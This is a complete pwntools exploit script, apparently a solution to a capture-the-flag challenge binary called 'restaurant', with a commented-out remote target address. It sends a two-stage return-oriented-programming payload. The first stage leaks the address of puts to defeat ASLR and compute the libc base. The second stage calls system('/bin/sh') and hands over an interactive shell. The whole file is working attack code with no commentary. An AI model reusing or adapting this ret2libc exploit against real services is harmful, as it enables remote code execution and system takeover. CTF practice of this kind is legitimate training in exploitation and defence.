from pwn import *

context.arch = 'amd64'
context.terminal = "kitty"
ASLR=True

exe = ELF("./restaurant")
libc = ELF("/usr/lib/libc.so.6")
IP = "134.209.177.202"
PORT = 32520

gdbinit = \
'''
continue
'''

io = gdb.debug(exe.path, gdbscript=gdbinit, aslr=ASLR)
#io = remote(IP, PORT)
#io = process(exe.path)

offset=40

chain1 = ROP(exe)
chain1.call(exe.plt['puts'], [next(exe.search(b""))])
chain1.call(exe.plt['puts'], [exe.got['puts']])
chain1.call((chain1.find_gadget(["ret"]))[0])
chain1.call(exe.symbols['fill'])

log.info(
"\n-------------------" +
"\nchain1:\n\n" + chain1.dump()+
"\n-------------------"
)

payload = flat({
    offset:[
        chain1.chain()
    ]
})

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b">", payload)
io.recvuntil(b"\n")
io.recvuntil(b"\n")
puts_runtime_address = u64(io.recvuntil(b"\n").strip().ljust(8, b"\x00"))
libc.address = puts_runtime_address - libc.symbols['puts']

log.info(
"-------------------" +
"\nputs leak:\t\t" + hex(puts_runtime_address)+
"\nlibc leak:\t\t" + hex(libc.address)+
"\nputs sym.:\t\t" + hex(libc.symbols['puts'])+
"\nsystem sym.:\t" + hex(libc.symbols['system'])+
"\n-------------------"
)

chain2 = ROP(libc)
chain2.call((chain2.find_gadget(["ret"]))[0])
chain2.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])
log.info(
"-------------------" +
"\nchain2:\n\n" + chain2.dump()+
"\n-------------------\n\n"
)

payload = flat({
    offset:[
        chain2.chain()
    ]
})

io.sendlineafter(b">" ,payload)
io.interactive()
